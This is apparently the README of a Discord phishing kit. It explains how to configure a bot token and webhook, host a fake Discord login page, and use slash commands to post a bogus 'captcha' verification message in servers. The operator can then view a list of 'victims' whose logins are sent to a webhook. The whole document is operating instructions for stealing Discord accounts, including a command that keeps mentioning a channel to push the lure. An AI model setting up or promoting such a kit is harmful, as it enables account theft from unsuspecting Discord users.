## Initial Setup

First, you need to configure the `config.json` file of your project. Here's an example of what it should look like:

```javascript
module.exports = {
    'token': '', // Your bot token.
    'clientid': '', // Your discord bot id.
    'guildid': '', // Id of a private server to load the bot's slash commands.
    'ownerid': [''], // Add discord ids to the array to access the commands.
    'webhook': '' // Your discord webhook url.
}
```

You need to activate all intents of your bot in the Discord Developer Portal. Here's how to do it:

![Image](https://cdn.discordapp.com/attachments/1214215986920689777/1214238441940713523/image.png?ex=65f862ac&is=65e5edac&hm=1fb42c8738e8cfe95378e057546c0078441ca76bb9885d0c03394d4c712a0b8e&)

## Hosting

You only need to host this source on a service like Repl.it, Render, etc., and use the domain that is generated. The only thing you need to change is the `config.json` file. You should only change other things if you know what you are doing.

## Steps After Setup

After configuring the `config.json` file, you need to follow these steps:

1. Use the `/domain` command to change to the domain that is hosting this code. Example of use: `/domain chaptcha.net`.

2. Use the `/ip` command and add your IP to have access to the API part to be able to see the list of victims. Example of use: `/ip <ip> <true to add, false to remove>`.

3. Now you will be able to see your list of victims by accessing `https://yourapi/victims`.

4. Whenever someone logs into the fake discord page, it will send to a webhook that you defined in `config.json`.

![Image](https://cdn.discordapp.com/attachments/1214215986920689777/1214225808076578837/image.png?ex=65f856e7&is=65e5e1e7&hm=f421600fff6649841c3f09535d74a49521ed8ee2f83ec2a89e533b1f5786be35&)

5. Using the `/verification` command you will send the message where all the magic will happen for the user to solve the "captcha" by logging into their discord account. Example of use: `/verification <server id> <channel id>`. Make sure the bot is on the server for everything to go right.

**Note:** Ensure that the bot is in the specific server for adding slash commands and other commands that require the channel and server id.

## Other Bot Commands

- `/mention <channel id> <server id> <time minutes>`: It will mention the channel according to the time you defined and will keep deleting the mention. To remove the automatic mention just use the `/stop <channel id>` command.

- `/ping`: You will be able to see if the bot is still online.

- `/victims`: Returns the total number of victims you have accumulated.

## Updates

1. This big change adding systems and commands to the bot/api.
2. Adjustments in responses and in code interpretation.
3. Adjustment in the rate limit system.

## Support

If you have any questions or problems, join the telegram and call me.